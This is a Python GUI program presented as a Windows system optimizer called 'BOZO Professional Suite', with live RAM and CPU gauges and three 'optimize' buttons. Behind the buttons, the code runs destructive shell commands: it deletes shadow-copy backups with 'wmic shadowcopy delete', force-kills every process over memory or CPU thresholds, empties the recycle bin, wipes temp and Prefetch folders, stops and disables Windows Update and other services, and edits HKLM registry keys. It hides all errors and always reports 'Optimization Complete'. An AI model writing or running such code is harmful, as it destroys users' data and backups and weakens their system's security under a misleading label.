import customtkinter as ctk
import psutil
import threading
import time
import platform
import subprocess
import winreg
from datetime import datetime

VERSION = "2.0 BETA"

class SystemOptimizer(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        # Configure window
        self.title(f"BOZO Professional Suite {VERSION}")
        self.geometry("1100x800")
        self.configure(fg_color="#0A0C1B")  # Deep, rich background
        
        # Set theme
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")
        
        self.setup_ui()
        
        # Start system stats update in background
        stats_thread = threading.Thread(target=self.update_system_stats, daemon=True)
        stats_thread.start()

    def setup_ui(self):
        # Configure grid
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        
        # Main container with luxury dark theme
        self.main_frame = ctk.CTkFrame(self, fg_color="#0A0C1B", corner_radius=0)
        self.main_frame.grid(row=0, column=0, sticky="nsew")
        self.main_frame.grid_columnconfigure(0, weight=1)
        
        # Elegant header with gradient effect
        self.header_frame = ctk.CTkFrame(self.main_frame, fg_color="#151631", height=120, corner_radius=0)
        self.header_frame.grid(row=0, column=0, sticky="ew")
        
        # Title section with version badge
        self.title_frame = ctk.CTkFrame(self.header_frame, fg_color="transparent")
        self.title_frame.place(relx=0.5, rely=0.5, anchor="center")
        
        self.title_label = ctk.CTkLabel(
            self.title_frame,
            text="BOZO PROFESSIONAL SUITE",
            font=ctk.CTkFont(family="Segoe UI", size=32, weight="bold"),
            text_color="#E2E4F3"  # Bright, clean white
        )
        self.title_label.grid(row=0, column=0, pady=(0, 5))
        
        self.version_label = ctk.CTkLabel(
            self.title_frame,
            text=f"VERSION {VERSION}",
            font=ctk.CTkFont(family="Segoe UI", size=14),
            text_color="#7A88CF"  # Soft blue for version
        )
        self.version_label.grid(row=1, column=0)
        
        # System Information Panel
        self.info_panel = ctk.CTkFrame(self.main_frame, fg_color="#151631")
        self.info_panel.grid(row=1, column=0, padx=40, pady=30, sticky="ew")
        self.info_panel.grid_columnconfigure(0, weight=1)
        
        # System specs display
        system_info = f"System: {platform.system()} {platform.release()} ({platform.machine()})"
        processor = platform.processor() or "Unknown Processor"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        self.system_info = ctk.CTkLabel(
            self.info_panel,
            text=f"{system_info}\nProcessor: {processor}\nLast Scan: {current_time}",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color="#7A88CF"
        )
        self.system_info.grid(row=0, column=0, padx=20, pady=20)
        
        # Performance Monitoring Panel
        self.monitor_frame = ctk.CTkFrame(self.main_frame, fg_color="#151631")
        self.monitor_frame.grid(row=2, column=0, padx=40, pady=(0, 30), sticky="ew")
        self.monitor_frame.grid_columnconfigure((0, 1), weight=1)
        
        # RAM Monitor with elegant styling
        self.ram_frame = ctk.CTkFrame(self.monitor_frame, fg_color="transparent")
        self.ram_frame.grid(row=0, column=0, padx=30, pady=25)
        
        self.ram_label = ctk.CTkLabel(
            self.ram_frame,
            text="Memory Usage",
            font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"),
            text_color="#E2E4F3"
        )
        self.ram_label.grid(row=0, column=0, sticky="w", pady=(0, 10))
        
        self.ram_progressbar = ctk.CTkProgressBar(
            self.ram_frame,
            width=400,
            height=4,
            progress_color="#4E7BF7",  # Royal blue
            corner_radius=2
        )
        self.ram_progressbar.grid(row=1, column=0)
        
        self.ram_value = ctk.CTkLabel(
            self.ram_frame,
            text="Analyzing...",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color="#7A88CF"
        )
        self.ram_value.grid(row=2, column=0, sticky="w", pady=(10, 0))
        
        # CPU Monitor with elegant styling
        self.cpu_frame = ctk.CTkFrame(self.monitor_frame, fg_color="transparent")
        self.cpu_frame.grid(row=0, column=1, padx=30, pady=25)
        
        self.cpu_label = ctk.CTkLabel(
            self.cpu_frame,
            text="Processor Usage",
            font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"),
            text_color="#E2E4F3"
        )
        self.cpu_label.grid(row=0, column=0, sticky="w", pady=(0, 10))
        
        self.cpu_progressbar = ctk.CTkProgressBar(
            self.cpu_frame,
            width=400,
            height=4,
            progress_color="#9D4EF7",  # Royal purple
            corner_radius=2
        )
        self.cpu_progressbar.grid(row=1, column=0)
        
        self.cpu_value = ctk.CTkLabel(
            self.cpu_frame,
            text="Analyzing...",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color="#7A88CF"
        )
        self.cpu_value.grid(row=2, column=0, sticky="w", pady=(10, 0))
        
        # Optimization Controls with premium styling
        self.controls_frame = ctk.CTkFrame(self.main_frame, fg_color="#151631")
        self.controls_frame.grid(row=3, column=0, padx=40, pady=(0, 30), sticky="ew")
        self.controls_frame.grid_columnconfigure((0, 1, 2), weight=1)
        
        # Memory Optimization
        self.ram_button = ctk.CTkButton(
            self.controls_frame,
            text="OPTIMIZE MEMORY",
            command=self.optimize_ram,
            font=ctk.CTkFont(family="Segoe UI", size=14, weight="bold"),
            fg_color="#4E7BF7",
            hover_color="#3D62C5",
            corner_radius=4,
            height=40,
            width=250
        )
        self.ram_button.grid(row=0, column=0, padx=20, pady=25)
        
        # CPU Optimization
        self.cpu_button = ctk.CTkButton(
            self.controls_frame,
            text="OPTIMIZE PROCESSOR",
            command=self.optimize_cpu,
            font=ctk.CTkFont(family="Segoe UI", size=14, weight="bold"),
            fg_color="#9D4EF7",
            hover_color="#7C3EC5",
            corner_radius=4,
            height=40,
            width=250
        )
        self.cpu_button.grid(row=0, column=1, padx=20, pady=25)
        
        # System Optimization
        self.sys_button = ctk.CTkButton(
            self.controls_frame,
            text="OPTIMIZE SYSTEM",
            command=self.optimize_system,
            font=ctk.CTkFont(family="Segoe UI", size=14, weight="bold"),
            fg_color="#F74E4E",
            hover_color="#C53E3E",
            corner_radius=4,
            height=40,
            width=250
        )
        self.sys_button.grid(row=0, column=2, padx=20, pady=25)
        
        # Status Panel with elegant design
        self.status_frame = ctk.CTkFrame(self.main_frame, fg_color="#151631")
        self.status_frame.grid(row=4, column=0, padx=40, pady=(0, 30), sticky="ew")
        
        self.status_label = ctk.CTkLabel(
            self.status_frame,
            text="System Analysis Complete • Ready for Optimization",
            font=ctk.CTkFont(family="Segoe UI", size=14),
            text_color="#7A88CF"
        )
        self.status_label.grid(row=0, column=0, padx=20, pady=20)
        
        # Footer with credits
        self.footer_frame = ctk.CTkFrame(self.main_frame, fg_color="#151631", height=60, corner_radius=0)
        self.footer_frame.grid(row=5, column=0, sticky="ew")
        
        self.footer_label = ctk.CTkLabel(
            self.footer_frame,
            text="Created by BOZO • Discord: 8ejj",
            font=ctk.CTkFont(family="Segoe UI", size=12),
            text_color="#4A4F6A"
        )
        self.footer_label.place(relx=0.5, rely=0.5, anchor="center")

    def update_system_stats(self):
        while True:
            try:
                # Update RAM usage
                ram = psutil.virtual_memory()
                ram_percent = ram.percent
                self.ram_progressbar.set(ram_percent / 100)
                self.ram_value.configure(text=f"{ram_percent}% ({self.get_size(ram.used)}/{self.get_size(ram.total)})")
                
                # Update CPU usage
                cpu_percent = psutil.cpu_percent()
                self.cpu_progressbar.set(cpu_percent / 100)
                self.cpu_value.configure(text=f"{cpu_percent}%")
                
                time.sleep(1)
            except Exception as e:
                print(f"Error updating stats: {e}")
                time.sleep(1)

    def get_size(self, bytes):
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if bytes < 1024:
                return f"{bytes:.1f}{unit}"
            bytes /= 1024

    def optimize_ram(self):
        def optimize():
            self.status_label.configure(text="⚡ Optimizing Memory...", text_color="#4E7BF7")
            self.ram_button.configure(state="disabled")
            
            try:
                if platform.system() == "Windows":
                    commands = [
                        "ipconfig /flushdns",
                        "powershell Clear-RecycleBin -Force -ErrorAction SilentlyContinue",
                        "del /s /f /q %temp%\\*.*",
                        "del /s /f /q C:\\Windows\\Temp\\*.*",
                        "del /s /f /q C:\\Windows\\Prefetch\\*.*",
                        "powershell Get-Process | Where-Object {$_.NonpagedSystemMemorySize -gt 10MB} | Stop-Process -Force",
                        "wmic shadowcopy delete",
                        "net stop sysmain",
                        "net stop wuauserv"
                    ]
                    
                    for cmd in commands:
                        try:
                            subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            time.sleep(0.5)
                        except:
                            continue
                    
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", 0, winreg.KEY_ALL_ACCESS)
                        winreg.SetValueEx(key, "ClearPageFileAtShutdown", 0, winreg.REG_DWORD, 1)
                        winreg.CloseKey(key)
                    except:
                        pass
                
                self.status_label.configure(text="✨ Memory Optimization Complete", text_color="#4E7BF7")
            except Exception as e:
                self.status_label.configure(text=f"Error: {str(e)}", text_color="#F74E4E")
            finally:
                self.ram_button.configure(state="normal")
        
        threading.Thread(target=optimize, daemon=True).start()

    def optimize_cpu(self):
        def optimize():
            self.status_label.configure(text="⚡ Optimizing Processor...", text_color="#9D4EF7")
            self.cpu_button.configure(state="disabled")
            
            try:
                if platform.system() == "Windows":
                    commands = [
                        "powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c",
                        "powershell Get-Process | Where-Object {$_.CPU -gt 20} | Stop-Process -Force",
                        "net stop themes",
                        "net stop TabletInputService",
                        "net stop DiagTrack",
                        "net stop SysMain",
                        "sc config \"SysMain\" start=disabled"
                    ]
                    
                    for cmd in commands:
                        try:
                            subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            time.sleep(0.5)
                        except:
                            continue
                    
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1", 0, winreg.KEY_ALL_ACCESS)
                        winreg.SetValueEx(key, "Attributes", 0, winreg.REG_DWORD, 2)
                        winreg.CloseKey(key)
                    except:
                        pass
                
                self.status_label.configure(text="✨ Processor Optimization Complete", text_color="#9D4EF7")
            except Exception as e:
                self.status_label.configure(text=f"Error: {str(e)}", text_color="#F74E4E")
            finally:
                self.cpu_button.configure(state="normal")
        
        threading.Thread(target=optimize, daemon=True).start()

    def optimize_system(self):
        def optimize():
            self.status_label.configure(text="⚡ Optimizing System...", text_color="#F74E4E")
            self.sys_button.configure(state="disabled")
            
            try:
                if platform.system() == "Windows":
                    commands = [
                        "net stop wuauserv",
                        "net stop bits",
                        "net stop dosvc",
                        "powershell Disable-MMAgent -mc",
                        "powershell Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Session Manager\\Memory Management' -Name 'ClearPageFileAtShutdown' -Value 1",
                        "powershell Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer' -Name 'AlwaysUnloadDLL' -Value 1",
                        "powershell fsutil behavior set disablelastaccess 1",
                        "powershell Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters' -Name 'ServiceDllUnloadOnStop' -Value 1"
                    ]
                    
                    for cmd in commands:
                        try:
                            subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            time.sleep(0.5)
                        except:
                            continue
                
                self.status_label.configure(text="✨ System Optimization Complete", text_color="#F74E4E")
            except Exception as e:
                self.status_label.configure(text=f"Error: {str(e)}", text_color="#F74E4E")
            finally:
                self.sys_button.configure(state="normal")
        
        threading.Thread(target=optimize, daemon=True).start()

if __name__ == "__main__":
    app = SystemOptimizer()
    app.mainloop()